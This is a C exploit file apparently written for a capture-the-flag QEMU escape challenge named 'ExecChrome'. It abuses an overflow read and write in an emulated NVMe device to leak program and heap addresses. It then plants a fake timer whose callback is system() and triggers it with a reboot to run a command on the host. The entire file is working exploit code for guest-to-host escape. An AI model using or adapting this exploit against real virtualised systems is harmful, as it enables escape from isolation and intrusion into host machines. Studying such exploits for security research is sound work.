/*
Author: raycp
File: exp.c
Description: exp for ExecChrome, nvme device with overflow read and write
Date: 2019-08-29
*/

#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>


unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}



void mmio_write(uint32_t addr, uint64_t value)
{
    *((uint64_t*)(mmio_mem + addr)) = value;
}

void mmio_writeb(uint32_t addr, uint8_t value)
{
    *((uint8_t*)(mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint32_t addr)
{
    return *((uint64_t*)(mmio_mem + addr));
}




int main(int argc, char *argv[])
{
    
    // step1 Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    // step2 leak program address and heap address
    printf("mmio_mem @ %p\n", mmio_mem);

    uint64_t leak_pro = mmio_read(0x1ff0);
    uint64_t pro_base = leak_pro - 0x84DFFD;
    uint64_t system_plt = pro_base + 0x2BC600;
    printf("leaking system plt: 0x%lx\n", system_plt);

    uint64_t leak_heap = mmio_read(0x1f98);
    uint64_t bar_addr = leak_heap-0x1fe0;
    printf("leaking heap address: 0x%lx\n", leak_heap);
    printf("leaking bar address: 0x%lx\n", bar_addr);

    // step3 write fake timer to 0xd90+bar 
    uint64_t timer_list = ((leak_heap - 0xe984e0) &0xfffffffffffff000) + 0x148a30; //important here, for heap address can't Accurately calculate the heap address, so use & to deranmize.
    uint64_t fake_timer= bar_addr+0xd90;
    mmio_write(0xd90, 0xffffffffffffffff);   //expire_time
    mmio_write(0xd98, timer_list);   //timer_list
    mmio_write(0xda0, system_plt);          // cb
    mmio_write(0xda8, bar_addr+0x200);            //opaque
    mmio_write(0xdb0, 0);                   //next
    mmio_write(0xdb8,0);                    //attributes
    mmio_write(0xdc0,1);                    // scale
    //step4 overwrite adim_sq to fake_timer, 0x100 is the offset between admin_sq address to bar address.
    mmio_write(0x100, fake_timer);

    //step5 write parameter to bar_addr + 0x200
    //char *para="google-chrome –no-sandbox file:///home/qwb/Desktop/success.mp4";
    char *para="deepin-calculator";
    uint32_t i;
    for (i=0; i<strlen(para); i++) {
        mmio_writeb(0x200+i, para[i]);
    }
    //step6 reboot to trigger timer
    system("reboot -h");


}
